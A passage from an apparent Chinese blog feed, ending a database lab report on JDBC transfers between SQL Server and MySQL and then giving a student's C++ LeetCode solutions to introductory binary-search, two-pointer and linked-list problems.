src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521182911972.png" alt="image-20220521182911972"><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521182936258.png" alt="image-20220521182936258"> <img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220521183004198.png" alt="image-20220521183004198"></p></li></ul><h2 id="6-实验心得"><a href="#6-实验心得" class="headerlink" title="6 实验心得"></a>6 实验心得</h2><p>​    这次实验让我进一步熟练了如何通过JDBC连接MySQL数据库并进行操作，而是首次接触SQL Server，刚开始使用<code>Windows身份认证</code>配置连接，结果接连出错，后来改用<code>SQL Server身份认证</code>，通过登录名和密码连接数据库从而成功在Java中配置数据源。</p><p>​    而在转移数据部分代码的编写中，我学会了如何使用<code>getMetaData()</code>获取当前连接数据库的元数据，并通过<code>getTable()</code>获取数据表，这里要格外注意在SQL Server和MySQL获取表信息的区别。既SQL Server查询获得表的语句<code>getTables(null, &quot;dbo&quot;, null, null)</code>为，MySQL的为：<code>md.getTables(null, null, null, new String[]&#123;&quot;TABLE&quot;&#125;)</code>。对于Mysql，需要在<code>连接URL</code>后面接上<code>nullCatalogMeansCurrent=true</code>，<strong>否则</strong>会返回所有数据库表的信息，而不是指定的数据库的表。</p><p>​    此次我对预编译SQL语句的对象<code>prepareStatement</code>的使用更加熟练，并学会如何对一组<code>SQL语句事务</code>进行批处理，即对于一个连接通过<code>setAutoCommit(false)</code>关闭自动提交，对于预编译对象，通过<code>addBatch()</code>将填充后SQL语句加入批处理队列，使用<code>executeBatch()</code>批量更新sql语句。最后对于连接，通过<code>commit()</code>将这组SQL事务提交，一次性执行。<strong>这样批量处理sql数据提高了数据库执行SQL语句的效率</strong>，解决了数据库处理速度快与sql语句一次次传输需要时间的冲突</p><p>​    在主函数中，我增加了与用户的交互模块，使使用者可以选择需要的转移数据功能，直接修改配置文件<strong>指定源数据库和目的数据库，使用列表保存用户需要转移的表</strong>，不将转移数据局限于固定的数据库和固定的表中中，即<strong>灵活地实现转移异构数据库中数据</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcode 算法入门</title>
    <link href="/2022/05/11/Leetcode-%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"/>
    <url>/2022/05/11/Leetcode-%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Leetcode-算法入门（C-）"><a href="#Leetcode-算法入门（C-）" class="headerlink" title="Leetcode 算法入门（C++）"></a>Leetcode 算法入门（C++）</h1><p>每题第一个代码均为本人所写代码，并非最优解，部分解法参考题解。</p><h2 id="第-1-天-二分查找"><a href="#第-1-天-二分查找" class="headerlink" title="第 1 天 二分查找"></a>第 1 天 二分查找</h2><h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode.cn/problems/binary-search/">704. 二分查找</a></h3><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span> (l &lt;= r)<br>        &#123;<br>            <span class="hljs-type">int</span> m = (l + r) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> (target == nums[m])<br>            &#123;<br>                <span class="hljs-keyword">return</span> m;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &lt; nums[m])<br>            &#123;<br>                r = m - <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                l = m + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(logN)$</li><li>数组，二分查找</li></ul><h3 id="278-第一个错误的版本"><a href="#278-第一个错误的版本" class="headerlink" title="278. 第一个错误的版本"></a><a href="https://leetcode.cn/problems/first-bad-version/">278. 第一个错误的版本</a></h3><p>你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。</p><p>假设你有 n 个版本 [1, 2, …, n]，你想找出导致之后所有版本出错的第一个错误的版本。</p><p>你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// The API isBadVersion is defined for you.</span><br><span class="hljs-comment">// bool isBadVersion(int version);</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">firstBadVersion</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> l=<span class="hljs-number">1</span>,r=n,ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;=r)<br>        &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> m=(l+r)/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">isBadVersion</span>(m))<br>            &#123;<br>                ans=m;<br>                r=m<span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                l=m+<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(logN)$</li><li>二分查找，交互</li></ul><h3 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a><a href="https://leetcode.cn/problems/search-insert-position/">35. 搜索插入位置</a></h3><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 O(log n) 的算法。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">searchInsert</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>,m;<br>        <span class="hljs-keyword">while</span>(l&lt;=r)<br>        &#123;<br>            m=(l+r)/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(nums[m]==target)<br>            &#123;<br>                <span class="hljs-keyword">return</span> m;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[m]&gt;target)<br>            &#123;<br>                r=m<span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                l=m+<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(target&gt;nums[m])<br>            <span class="hljs-keyword">return</span> m+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> m;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(logN)$</li><li>数组，二分查找</li></ul><h2 id="第-2-天-双指针"><a href="#第-2-天-双指针" class="headerlink" title="第 2 天 双指针"></a>第 2 天 双指针</h2><p><a href="https://leetcode.cn/problems/squares-of-a-sorted-array/">977. 有序数组的平方</a></p><p>给你一个按 <strong>非递减顺序</strong> 排序的整数数组 <code>nums</code>，返回 <strong>每个数字的平方</strong> 组成的新数组，要求也按 <strong>非递减顺序</strong> 排序。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sortedSquares</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> r=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">result</span><span class="hljs-params">(nums.size(),<span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=r;i&lt;=j; )<br>        &#123;<br>            <span class="hljs-keyword">if</span>(nums[i]*nums[i]&lt;nums[j]*nums[j])<br>            &#123;<br>                result[r] = nums[j]*nums[j];<br>                j--; <br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                result[r] = nums[i]*nums[i];<br>                i++;<br>            &#125;<br>            r--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>数组，双指针，排序</li></ul><h3 id="189-轮转数组"><a href="#189-轮转数组" class="headerlink" title="189. 轮转数组"></a><a href="https://leetcode.cn/problems/rotate-array/">189. 轮转数组</a></h3><p>给你一个数组，将数组中的元素向右轮转 <code>k</code> 个位置，其中 <code>k</code> 是非负数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverse</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; A,<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> j)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j)<br>        &#123;<br>            <span class="hljs-type">int</span> temp = A[j];<br>            A[j]=A[i];<br>            A[i]=temp;<br>            i++;<br>            j--;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//整体翻转一次，按分割线两边翻转一次</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rotate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-comment">//防循环</span><br>        k=k%nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> r=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">reverse</span>(nums,<span class="hljs-number">0</span>,r);<br>        <span class="hljs-built_in">reverse</span>(nums,<span class="hljs-number">0</span>,k<span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">reverse</span>(nums,k,r);<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>空间复杂度$O(1)$</li><li>数组，数学，双指针</li></ul><h2 id="第-3-天-双指针"><a href="#第-3-天-双指针" class="headerlink" title="第 3 天 双指针"></a>第 3 天 双指针</h2><h3 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode.cn/problems/move-zeroes/">283. 移动零</a></h3><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p><p><strong>请注意</strong> ，必须在不复制数组的情况下原地对数组进行操作。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> len=nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(nums[i]!=<span class="hljs-number">0</span>)<br>                nums[j++]=nums[i];<br>        &#125;<br>        <span class="hljs-keyword">while</span>(j&lt;len)<br>        &#123;<br>            nums[j++]=<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>空间复杂度$O(1)$</li><li>数组</li></ul><h3 id="167-两数之和-II-输入有序数组"><a href="#167-两数之和-II-输入有序数组" class="headerlink" title="167. 两数之和 II - 输入有序数组"></a><a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/">167. 两数之和 II - 输入有序数组</a></h3><p>给你一个下标从 1 开始的整数数组 numbers ，该数组已按 非递减顺序排列  ，请你从数组中找出满足相加之和等于目标数 target 的两个数。如果设这两个数分别是 numbers[index1] 和 numbers[index2] ，则 1 &lt;= index1 &lt; index2 &lt;= numbers.length 。</p><p>以长度为 2 的整数数组 [index1, index2] 的形式返回这两个整数的下标 index1 和 index2。</p><p>你可以假设每个输入 只对应唯一的答案 ，而且你 不可以 重复使用相同的元素。</p><p>你所设计的解决方案必须只使用常量级的额外空间。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=numbers.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-type">bool</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(i&lt;j)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(target==numbers[i]+numbers[j])<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target&lt;numbers[i]+numbers[j])<br>            &#123;<br>                j--;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                i++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;i+<span class="hljs-number">1</span>,j+<span class="hljs-number">1</span>&#125;;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>空间复杂度$O(1)$</li><li>数组，指针，二分查找</li></ul><h2 id="第-4-天-双指针"><a href="#第-4-天-双指针" class="headerlink" title="第 4 天 双指针"></a>第 4 天 双指针</h2><h3 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a href="https://leetcode.cn/problems/reverse-string/">344. 反转字符串</a></h3><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 s 的形式给出。</p><p>不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverseString</span><span class="hljs-params">(vector&lt;<span class="hljs-type">char</span>&gt;&amp; s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=s.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(;i&lt;j;i++,j--)<br>        &#123;<br>            <span class="hljs-type">char</span> temp=s[i];<br>            s[i]=s[j];<br>            s[j]=temp;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>空间复杂度$O(1)$</li><li>双指针，字符串</li></ul><h3 id="557-反转字符串中的单词-III"><a href="#557-反转字符串中的单词-III" class="headerlink" title="557. 反转字符串中的单词 III"></a><a href="https://leetcode.cn/problems/reverse-words-in-a-string-iii/">557. 反转字符串中的单词 III</a></h3><p>给定一个字符串 <code>s</code> ，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverseString</span><span class="hljs-params">(string&amp; s,<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i=l,j=r;<br>        <span class="hljs-keyword">for</span>(;i&lt;j;i++,j--)<br>        &#123;<br>            <span class="hljs-type">char</span> temp=s[i];<br>            s[i]=s[j];<br>            s[j]=temp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function">string <span class="hljs-title">reverseWords</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> len=s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;=len;k++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(s[k]==<span class="hljs-string">&#x27; &#x27;</span>||k==len)<br>            &#123;<br>                r=k<span class="hljs-number">-1</span>;<br>                <span class="hljs-built_in">reverseString</span>(s,l,r);<br>                l=k+<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n)$</li><li>空间复杂度$O(1)$</li><li>双指针，字符串</li></ul><h2 id="第-5-天-双指针"><a href="#第-5-天-双指针" class="headerlink" title="第 5 天 双指针"></a>第 5 天 双指针</h2><h3 id="876-链表的中间结点"><a href="#876-链表的中间结点" class="headerlink" title="876. 链表的中间结点"></a><a href="https://leetcode.cn/problems/middle-of-the-linked-list/">876. 链表的中间结点</a></h3><p>给定一个头结点为 <code>head</code> 的非空单链表，返回链表的中间结点。</p><p>如果有两个中间结点，则返回第二个中间结点。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">middleNode</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>        ListNode *now=head;<br>        <span class="hljs-keyword">while</span>(now-&gt;next)<br>        &#123;<br>            now=now-&gt;next;<br>            ListNode *temp=now;<br>            <span class="hljs-type">bool</span> flag=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=i;j++)<br>            &#123;<br>                temp=temp-&gt;next;<br>                <span class="hljs-keyword">if</span>(temp==<span class="hljs-literal">nullptr</span>)<br>                &#123;<br>                    flag=<span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(flag==<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> now;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度$O(n^2)$</li><li>链表，双指针</li></ul><h3 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a><a href="https://leetcode.cn/problems/remove-nth-node-from-end-of-list/">19. 删除链表的倒数第 N 个结点</a></h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 